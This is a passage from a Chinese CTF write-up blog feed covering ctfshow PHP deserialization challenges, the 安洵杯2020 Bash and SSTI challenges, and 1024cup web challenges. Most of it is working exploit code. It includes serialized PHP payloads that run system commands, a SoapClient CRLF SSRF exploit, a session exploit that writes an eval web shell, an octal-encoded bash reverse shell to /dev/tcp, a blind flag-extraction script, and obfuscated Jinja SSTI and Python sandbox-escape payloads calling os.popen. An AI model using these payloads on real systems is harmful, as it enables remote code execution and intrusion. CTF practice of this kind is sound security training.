class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $code = <span class="string">'system("cat f*");'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a  = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="comment">//private改成了public</span></span><br><span class="line"><span class="comment">//正则匹配用+号绕过o:之后的数字匹配即可</span></span><br></pre></td></tr></table></figure><h3 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$vip = unserialize($_GET[<span class="string">'vip'</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line">$vip-&gt;getFlag();</span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$xff = explode(<span class="string">','</span>, $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</span><br><span class="line">array_pop($xff);</span><br><span class="line">$ip = array_pop($xff);</span><br><span class="line"><span class="keyword">if</span>($ip!==<span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$token = $_POST[<span class="string">'token'</span>];</span><br><span class="line"><span class="keyword">if</span>($token==<span class="string">'ctfshow'</span>)&#123;</span><br><span class="line">file_put_contents(<span class="string">'flag.txt'</span>,$flag);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察序列化但是没有给类和方法，说明考察内置类，这里考察SoapClient反序列化+clrf打ssrf，下面是两篇参考文章</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_38154820&#x2F;article&#x2F;details&#x2F;106330082</span><br><span class="line">https:&#x2F;&#x2F;wooyun.js.org&#x2F;drops&#x2F;CRLF%20Injection漏洞的利用与实例分析.html</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/flag.php'</span>;</span><br><span class="line"><span class="comment">//$post_string = 'data=something';</span></span><br><span class="line">$post_string = <span class="string">'token=ctfshow'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1,127.0.0.1'</span>,</span><br><span class="line">    <span class="comment">//'Cookie: PHPSESSID=my_session'</span></span><br><span class="line">    <span class="string">'UM_distinctid:176faec63301f9-04a3a854efc541-4c3f207e-144000-176faec6331407'</span></span><br><span class="line">);</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>=&gt;<span class="string">"aaab"</span>));</span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;'</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> urlencode($aaa);</span><br></pre></td></tr></table></figure><p>传参给vip之后访问/flag.txt即可</p><h3 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h3><p>正则匹配，直接将匹配内容传给参数即可</p><h3 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h3><h3 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h3><p>序列化逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//message.php</span></span><br><span class="line"><span class="keyword">if</span>($msg-&gt;token==<span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//index.php</span></span><br><span class="line">$umsg = str_replace(<span class="string">'fuck'</span>, <span class="string">'loveU'</span>, serialize($msg));</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="string">";s:5:"</span>token<span class="string">";s:5:"</span>admin<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>传参即可，访问message.php</p><h3 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h3><p><a href="http://www.zip拿到了源码" target="_blank" rel="noopener">www.zip拿到了源码</a></p><p>session序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_serialize引擎 a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">6</span>:<span class="string">"spoock"</span>;&#125;</span><br><span class="line">php引擎 name|s:<span class="number">6</span>:<span class="string">"spoock"</span>;</span><br><span class="line">php_binary引擎 names:<span class="number">6</span>:<span class="string">"spoock"</span>;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#inc.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $status;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span><span class="params">($s)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=$s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">"log-"</span>.<span class="keyword">$this</span>-&gt;username, <span class="string">"使用"</span>.<span class="keyword">$this</span>-&gt;password.<span class="string">"登陆"</span>.(<span class="keyword">$this</span>-&gt;status?<span class="string">"成功"</span>:<span class="string">"失败"</span>).<span class="string">"----"</span>.date_create()-&gt;format(<span class="string">'Y-m-d H:i:s'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//写文件，可以写入一句话shell</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line">setcookie(<span class="string">"limit"</span>,base64_encode(<span class="string">'1'</span>));</span><br><span class="line">写入cookie</span><br><span class="line"><span class="comment">#check.php</span></span><br><span class="line">$_COOKIE[<span class="string">'limit'</span>] = base64_encode(base64_decode($_COOKIE[<span class="string">'limit'</span>])+<span class="number">1</span>);</span><br><span class="line">调用了cookie</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $status;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> User();</span><br><span class="line">$a-&gt;username = <span class="string">'a.php'</span>;</span><br><span class="line">$a-&gt;password = <span class="string">'&lt;?php eval($_POST["cmd"]);?&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">'|'</span>.serialize($a));</span><br><span class="line"><span class="comment">#fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiJhLnBocCI7czo4OiJwYXNzd29yZCI7czoyODoiPD9waHAgZXZhbCgkX1BPU1RbImNtZCJdKTs/PiI7czo2OiJzdGF0dXMiO047fQ==</span></span><br></pre></td></tr></table></figure><p>修改cookie，访问<code>index.php</code>再访问<code>check.php</code>，这里会生成<code>log-a.php</code>文件，访问就可以利用</p><h3 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h3><p>和262一样，只不过多了个cookie验证，然后<code>$_cookie[]</code>换成了<code>$_SESSION[]</code></p><h3 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h3><p>按地址传参，一个值改变另一个值都会相应发生变化</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="string">'a'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = &amp;<span class="keyword">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> ctfshowAdmin();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><h3 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h3><p>类名大小写不敏感</p><h3 id="web267-270"><a href="#web267-270" class="headerlink" title="web267-270"></a>web267-270</h3><p>看Yii框架反序列化漏洞分析文章</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;序列化部分练手，避免手生
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>安洵杯2020复现</title>
    <link href="http://yoursite.com/2020/12/18/%E5%AE%89%E6%B4%B5%E6%9D%AF2020%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2020/12/18/%E5%AE%89%E6%B4%B5%E6%9D%AF2020%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-12-18T07:44:31.000Z</published>
    <updated>2021-01-13T09:08:22.597Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言<a id="more"></a></h3><p>比赛当天在赶路，只看到了这一题，没好好看，源码放送来复现了</p><h2 id="Bash-Vino0o0o"><a href="#Bash-Vino0o0o" class="headerlink" title="Bash-Vino0o0o"></a>Bash-Vino0o0o</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>bash</li><li>移位运算</li></ul><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"cmd"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $test = $_POST[<span class="string">'cmd'</span>];</span><br><span class="line">    $white_list = str_split(<span class="string">'$&#123;#&#125;\\(&lt;)\'0'</span>); </span><br><span class="line">    $char_list = str_split($test);</span><br><span class="line">    <span class="keyword">foreach</span>($char_list <span class="keyword">as</span> $c)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!in_array($c,$white_list))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"Cyzcc"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    exec($test);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>无回显的命令执行，给了白名单，限制了能用的字符</p><p>无回显，盲注或者反弹shell，重点部分是拼凑出字符</p><p>这里可以利用八进制转换成字符进行bash命令执行，所以只需要拼凑出0-7的数字，再进行转换</p><p>转换成数字之后就需要用到<code>&lt;&lt;&lt;</code>来重定向了，但是一层不够，只用一层会出现<code>bash: $&#39;\154\163&#39;: command not found</code>这样的报错，需要第二次解析。因此需要给原先的命令添加转义字符</p><p>直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">n = dict()</span><br><span class="line">n[<span class="number">0</span>] = <span class="string">'0'</span></span><br><span class="line">n[<span class="number">1</span>] = <span class="string">'$&#123;##&#125;'</span></span><br><span class="line">n[<span class="number">2</span>] = <span class="string">'$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))'</span></span><br><span class="line">n[<span class="number">3</span>] = <span class="string">'$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;))'</span></span><br><span class="line">n[<span class="number">4</span>] = <span class="string">'$(($&#123;##&#125;&lt;&lt;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))))'</span></span><br><span class="line">n[<span class="number">5</span>] = <span class="string">'$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;))'</span></span><br><span class="line">n[<span class="number">6</span>] = <span class="string">'$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;0))'</span></span><br><span class="line">n[<span class="number">7</span>] = <span class="string">'$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))'</span></span><br><span class="line">f=<span class="string">''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_oct</span><span class="params">(cmd)</span>:</span>                                <span class="comment">#命令转换成八进制字符串</span></span><br><span class="line">    s = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> cmd:</span><br><span class="line">        o = (<span class="string">'%s'</span> % (oct(ord(t))))[<span class="number">2</span>:]</span><br><span class="line">        s+=<span class="string">'\\'</span>+o</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(cmd)</span>:</span>                                     <span class="comment">#八进制字符串转换成字符</span></span><br><span class="line">    payload = <span class="string">"$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\\\'"</span></span><br><span class="line">    s = str_to_oct(cmd).split(<span class="string">'\\'</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        payload+=<span class="string">"\\\\"</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> _:</span><br><span class="line">            payload+=n[int(i)]</span><br><span class="line">    <span class="keyword">return</span> payload+<span class="string">'\\\''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(url,payload)</span>:</span>                          <span class="comment">#盲注函数</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;<span class="string">'cmd'</span>:payload&#125;</span><br><span class="line">        r = requests.post(url,data,timeout=<span class="number">1.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">print(build(<span class="string">'bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1'</span>))</span><br><span class="line"><span class="comment"># a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&#123;&#125;@'</span></span><br><span class="line"><span class="comment"># for i in range(1,50):</span></span><br><span class="line"><span class="comment">#     for j in a:</span></span><br><span class="line"><span class="comment">#         cmd=f'cat /flag|grep ^&#123;f+j&#125;&amp;&amp;sleep 3'</span></span><br><span class="line"><span class="comment">#         url = "ip/"</span></span><br><span class="line"><span class="comment">#         if get_flag(url,build(cmd)):</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment">#     f = f+j</span></span><br><span class="line"><span class="comment">#     print(f)</span></span><br></pre></td></tr></table></figure><p>反弹shell和盲注都能打通</p><p>#反弹</p><img src="/2020/12/18/%E5%AE%89%E6%B4%B5%E6%9D%AF2020%E5%A4%8D%E7%8E%B0/1.png" class=""><p>#盲注</p><img src="/2020/12/18/%E5%AE%89%E6%B4%B5%E6%9D%AF2020%E5%A4%8D%E7%8E%B0/2.png" class=""><h2 id="Normal-SSTI"><a href="#Normal-SSTI" class="headerlink" title="Normal SSTI"></a>Normal SSTI</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>SSTI模板注入绕过</li><li>unicode绕过</li></ul><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>这道题本地复现遇到问题，环境搭好了访问一直是500，暂时不知是不是因为刚用了翻墙软件的原因，这道题本身不难，主要是下面几个点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 没有&#96;&#123;&#123;&#125;&#125;&#96;构造回显&#96;(&#123;%print()%&#125;)&#96;</span><br><span class="line">2. 绕过字符串过滤</span><br></pre></td></tr></table></figure><p>直接放payload</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test?url=&#123;%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22))|attr(%22\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)()%&#125;</span><br></pre></td></tr></table></figure><p>这道题暂且这样，有机会再弄弄</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言
    
    </summary>
    
    
    
      <category term="安洵杯" scheme="http://yoursite.com/tags/%E5%AE%89%E6%B4%B5%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>1024cup</title>
    <link href="http://yoursite.com/2020/12/02/1024cup/"/>
    <id>http://yoursite.com/2020/12/02/1024cup/</id>
    <published>2020-12-02T08:58:45.000Z</published>
    <updated>2020-12-06T12:05:24.591Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1024-WEB签到"><a href="#1024-WEB签到" class="headerlink" title="1024_WEB签到"></a>1024_WEB签到<a id="more"></a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">call_user_func($_GET[<span class="string">'f'</span>]);</span><br></pre></td></tr></table></figure><p>这道题<code>call_user_func</code>只有一个参数，试了试只能调用phpinfo</p><p>开始以为phpinfo里没什么用，后来发现就藏在这里面</p><img src="/2020/12/02/1024cup/1.png" class=""><p>这里有一个能调用的方法，直接调用就有flag了</p><img src="/2020/12/02/1024cup/2.png" class=""><h2 id="1024-fastapi"><a href="#1024-fastapi" class="headerlink" title="1024_fastapi"></a>1024_fastapi</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>SSTI模板注入</li></ul><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>fastapi，搜索官方文档说明，发现有默认的两个访问路径，选择其中一个就可以，<code>/docs</code>或者<code>/redoc</code></p><p>访问其中一个</p><img src="/2020/12/02/1024cup/3.png" class=""><p>存在<code>/cccalccc</code>，post传参给<code>q</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=str([].__class__.__base__.__subclasses__())</span><br></pre></td></tr></table></figure><p>这里要以list或者是str的类型传参给q，不然会报<code>Internal Server Error</code>的错，找<code>warning.catch_warnings</code>的下标</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://48c0106d-3023-4d93-834d-fe65ca1f76e8.chall.ctf.show/cccalccc"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'q'</span> : <span class="string">'str([].__class__.__base__.__subclasses__()['</span>+str(i)+<span class="string">'])'</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'warnings.catch_warning'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(i)</span><br><span class="line"><span class="comment">#i=189</span></span><br></pre></td></tr></table></figure><p>下面就是常规知识点，过滤了<code>import</code>用字符串进行拼接，<code>popen</code>替换<code>system</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str([].__class__.__base__.__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__imp'</span>+<span class="string">'ort__'</span>](<span class="string">'os'</span>).__dict__[<span class="string">'pop'</span>+<span class="string">'en'</span>](<span class="string">'find /app|xargs grep flag'</span>).read())</span><br><span class="line"><span class="comment">#查找flag文件</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"res"</span>: <span class="string">"/app/main.py:        hint = \"flag is in /mnt/f1a9,try to read it\"\n/app/start.sh:source flag.sh\n"</span>,</span><br><span class="line">    <span class="string">"err"</span>: false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取flag即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str([].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;cat &#x2F;mnt&#x2F;f1a9&#39;).read())</span><br></pre></td></tr></table></figure><img src="/2020/12/02/1024cup/4.png" class=""><h2 id="1024-柏拉图"><a href="#1024-柏拉图" class="headerlink" title="1024_柏拉图"></a>1024_柏拉图</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>伪协议</li><li>phar</li></ul><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，有一个url，可以读到baidu</p><p>尝试伪协议，发现file://双写可以绕过</p><p>发现还有一个class.php，读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"THI IS 